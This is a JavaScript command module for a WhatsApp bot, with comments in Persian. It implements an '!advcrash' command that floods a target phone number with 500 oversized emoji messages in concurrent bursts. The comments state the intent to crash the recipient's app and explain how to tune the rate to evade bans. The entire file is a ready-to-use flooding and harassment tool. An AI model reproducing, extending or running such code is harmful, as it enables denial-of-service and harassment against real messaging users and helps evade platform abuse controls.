export default async function advancedCrash(sock, from, body, m, args) {
    try {
        // ==========================================
        // تنظیمات پیشرفته (Advanced Settings)
        // ==========================================
        
        // متن یا محتوای سنگین برای ارسال (می‌توانید تغییر دهید)
        const heavyContent = "🔥💀👻⚡️💣💥🚀🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🔥💀👻⚡️💣💥🚀🎉🎊🎉🎊"; 
        
        // تعداد کل پیام‌ها در هر دور
        const totalMessages = 500; 
        
        // تعداد پیام‌هایی که همزمان ارسال می‌شوند (Concurrency Level)
        // هرچه بالاتر باشد، سریع‌تر است اما احتمال بن شدن بیشتر است.
        const concurrency = 20; 
        
        // تاخیر بین هر دور ارسال (برای جلوگیری از Ban کامل)
        const delayBetweenBursts = 100; // میلی‌ثانیه

        // ==========================================
        // پایان تنظیمات
        // ==========================================

        // دریافت شماره تارگت
        const target = args[0];

        if (!target) {
            await sock.sendMessage(from, { 
                text: `⚙️ *Advanced Crash Tool*\nUsage: !advcrash [Number]\nExample: !advcrash 98912345678` 
            });
            return;
        }

        // اطلاع‌رسانی شروع
        await sock.sendMessage(from, { text: `🚀 Starting Advanced Crash on ${target}... (Concurrent: ${concurrency})` });

        // فرمت‌دهی شماره
        let cleanTarget = target.replace(/[^0-9@]/g, ''); 
        if (!cleanTarget.includes('@')) {
            cleanTarget += '@c.us';
        }

        // پیدا کردن چت یا ایجاد شناسه مستقیم
        const chatId = cleanTarget; 

        // تابع کمکی برای ارسال یک پیام به صورت ناهمگام (Async)
        const sendSingleMessage = async () => {
            try {
                await sock.sendMessage(chatId, { 
                    text: heavyContent + ` [${Math.floor(Math.random() * 1000)}]` // اضافه کردن عدد تصادفی برای تنوع
                });
            } catch (err) {
                // اگر خطایی رخ داد، نادیده می‌گیریم تا حلقه قطع نشود
                // console.error(err); 
            }
        };

        // تابع اصلی برای اجرای همزمان پیام‌ها
        const executeBurst = async () => {
            const promises = [];
            for (let i = 0; i < concurrency; i++) {
                promises.push(sendSingleMessage());
            }
            // منتظر می‌مانیم تا تمام پیام‌های این دور ارسال شوند
            await Promise.all(promises);
        };

        // حلقه اصلی برای ارسال تعداد کل پیام‌ها
        const totalBursts = Math.ceil(totalMessages / concurrency);
        
        for (let i = 0; i < totalBursts; i++) {
            await executeBurst();
            
            // تاخیر کوتاه بین هر دسته از پیام‌ها
            if (i < totalBursts - 1) {
                await new Promise(resolve => setTimeout(resolve, delayBetweenBursts));
            }
        }

        // اطلاع‌رسانی پایان
        await sock.sendMessage(from, { text: `✅ Advanced Crash Completed on ${target}.\nTotal Messages: ~${totalMessages}` });

    } catch (error) {
        console.error("ADVANCED CRASH ERROR:", error);
        await sock.sendMessage(from, { text: `❌ Error: ${error.message}` });
    }
}